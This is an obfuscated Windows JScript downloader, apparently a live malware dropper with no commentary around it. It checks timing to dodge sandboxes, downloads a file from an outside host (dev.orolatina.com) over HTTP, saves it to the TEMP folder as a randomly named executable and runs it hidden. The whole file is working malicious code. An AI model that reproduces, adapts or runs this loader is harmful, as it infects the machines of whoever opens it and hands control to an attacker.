var _Y = false;
var _A = "CreateObject";
var _O = function _DO() {return WScript[_A]("WScript"+".Shell");}(), _E = 11;
var _K0 = "MSXML2.XMLHTTP";
var _X0 = 2123213;
var _OM = 0;
function _LK(_LJ){_O["Run"](_LJ, _OM, _OM);};
function _SW(){return _K0 + "";};
function _K(_V, _T0){_OM = _OM * 1; return _V - _T0;};
function _EY(){return _A;};
/*@cc_on
  @if (@_win32 || @_win64)
    _Y = true;
  @end
@*/
if (_Y)
{
var _XN = "";
function _QX(){return 22;};
var _N = 0; var _SW1 = 0;
function _KK()
{
var _SW0 = new this["Date"]();
var _G = _SW0["getUTCMilliseconds"]();
WScript["Sleep"](_QX());
var _SW0 = new this["Date"]();
var _D = _SW0["getUTCMilliseconds"]();
WScript["Sleep"](_QX());
var _SW0 = new this["Date"]();
var _W = _SW0["getUTCMilliseconds"]();
var _N = "_EH";
_N = _K(_D, _G);
var _SW1 = "_R";
_SW1 = _K(_W, _D);
_XN = "open";
return _K(_N, _SW1);
}
var _MY = false;
var _Z0 = false;
for (var _IJ = _OM; _IJ < _QX() * 1; _IJ++){if (_KK() != _OM){
_MY = true; 
_SW1 = "31" + 11 * _N + _SW1; 
_Z0 = true; 
break;
}}
function _RP() {return ((_MY == true) && (_MY == _Z0)) ? 1 : _OM;};
if (_MY && _RP() && _Z0){
function _Z() {return _O["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9QUHbgggjriOQp.ex" + "e";};
 _AA = _SW();
 _W0 = WScript[_A](_AA);
 var _P = 1;
 while (_P){
try {
	if (_P == 1)
	{
		_W0[_XN]("GET", "http://dev.orolatina.com/s3isk", false);
		_W0["send"]();
		_VT = "Sleep";
	}
	WScript[_VT](_QX() + 120); 
	if (_W0["readystate"] < 2 * 2) continue;
	_P = _OM;
	function _X(_PX) {var _KS = (1, 2, 3, 4, 5, _PX); return _KS;};
	_Y0 = WScript[_EY()]("ADODB.Stream");
	_AA = _Y0;
	_AA[_XN]();
	_AA["type"] = _X(1);
	_AA["write"](_W0["ResponseBody"]);
	_Y0["position"] = _X(_OM);
	_AA["Save" + "ToFile"](_Z(), 2);
	_Y0["cl"+"ose"]();
	_T = _Z();
	_LK(_T);
} catch(_QB){};
}
}
}

